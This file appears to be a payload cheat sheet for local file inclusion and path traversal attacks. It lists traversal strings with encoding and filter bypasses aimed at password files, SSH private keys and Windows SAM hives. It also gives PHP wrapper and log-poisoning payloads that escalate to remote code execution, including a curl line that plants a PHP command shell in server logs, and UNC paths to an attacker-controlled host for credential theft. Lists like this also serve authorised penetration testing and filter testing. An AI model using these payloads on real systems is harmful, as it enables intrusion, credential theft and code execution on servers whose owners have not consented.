## ============================================================
## LFI / Path Traversal Payloads — Local File Inclusion
## ============================================================

## ---- BASIC TRAVERSAL (Linux) ----
../../../etc/passwd
../../../etc/shadow
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd

## ---- BASIC TRAVERSAL (Windows) ----
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\..\windows\win.ini
..\..\..\..\boot.ini
..\..\..\windows\system.ini

## ---- NULL BYTE INJECTION (PHP < 5.3.4) ----
../../../etc/passwd%00
../../../etc/passwd%00.php
../../../etc/passwd%00.html
../../../etc/passwd%00.jpg
../../../etc/passwd\0

## ---- ENCODING BYPASS ----
## URL encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%252f..%252f..%252fetc%252fpasswd

## Double URL encoding
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc/passwd

## UTF-8 / Unicode encoding
..%c0%ae/..%c0%ae/..%c0%ae/etc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd

## Mixed slashes
..\/..\/..\/etc/passwd
../.\../.\..\./etc/passwd

## ---- FILTER BYPASS TECHNIQUES ----
## Dot-dot-slash blocked
....//....//....//etc/passwd
..../..../..../etc/passwd
....\/....\/....\/etc/passwd

## Stripped non-recursively
....//....//....//etc/passwd
..././..././..././etc/passwd
...\.\...\.\...\.\etc\hosts

## Absolute path
/etc/passwd
/etc/shadow
/proc/self/environ
C:\windows\win.ini

## ---- INTERESTING LINUX FILES ----
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/crontab
/etc/issue
/etc/motd
/etc/ssh/sshd_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/etc/postgresql/pg_hba.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog
/var/log/mail.log
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/proc/version
/proc/net/tcp
/proc/sched_debug
/home/*/.bash_history
/home/*/.ssh/id_rsa
/home/*/.ssh/authorized_keys
/root/.bash_history
/root/.ssh/id_rsa

## ---- INTERESTING WINDOWS FILES ----
C:\windows\win.ini
C:\windows\system.ini
C:\windows\system32\drivers\etc\hosts
C:\boot.ini
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\logfiles
C:\windows\debug\netsetup.log
C:\windows\repair\sam
C:\windows\repair\system
C:\windows\repair\software
C:\windows\system32\config\sam
C:\windows\system32\config\system
C:\windows\system32\config\regback\sam
C:\users\*\desktop\desktop.ini
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\wamp\bin\apache\apache*\conf\httpd.conf

## ---- APPLICATION CONFIG FILES ----
## Web application configs
.env
config.php
config.inc.php
wp-config.php
configuration.php
database.yml
settings.py
config/database.yml
app/config/parameters.yml
.git/config
.svn/entries
.htaccess
.htpasswd

## ---- PHP WRAPPERS (LFI to RCE) ----
## Read source code (base64)
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/read=convert.base64-encode/resource=index.php

## PHP filter chains (source read without base64)
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php

## RCE via php://input (POST body = PHP code)
## Include: php://input
## POST body: <?php system('id'); ?>

## RCE via data:// wrapper
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

## RCE via expect:// (if expect module loaded)
expect://id
expect://whoami

## Zip wrapper (upload zip containing PHP)
zip://uploads/shell.zip%23cmd.php
zip:///var/www/uploads/shell.zip%23cmd.php

## Phar wrapper
phar://uploads/shell.phar/cmd.php
phar://shell.jpg/cmd.php

## ---- LOG POISONING (LFI to RCE) ----
## Step 1: Inject PHP into logs via User-Agent or Referer
## curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
## Step 2: Include the log file
/var/log/apache2/access.log&cmd=id
/var/log/nginx/access.log&cmd=id
/var/log/apache/access.log&cmd=id
/var/log/httpd/access_log&cmd=id

## SSH log poisoning
## ssh '<?php system($_GET["cmd"]); ?>'@target
## Then include: /var/log/auth.log&cmd=id

## Mail log poisoning
## Send email with PHP payload in subject/body
## Then include: /var/log/mail.log&cmd=id

## ---- /PROC/SELF/ENVIRON INJECTION ----
## Inject PHP via User-Agent header, then include:
/proc/self/environ
## The User-Agent value will be in the output with PHP executed

## ---- PHPINFO + LFI (race condition) ----
## 1. Upload file via phpinfo() multipart form (creates temp file)
## 2. Race to include /tmp/php[random] before it's deleted
## Reference: insomnia.tools phpinfo-lfi exploit

## ---- SESSION FILE INCLUSION ----
## Inject PHP into session variable, then include session file
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
C:\windows\temp\sess_[PHPSESSID]

## ---- WINDOWS UNC PATH (SSRF/CREDENTIAL THEFT) ----
\\attacker-ip\share\file
\\attacker-ip\share
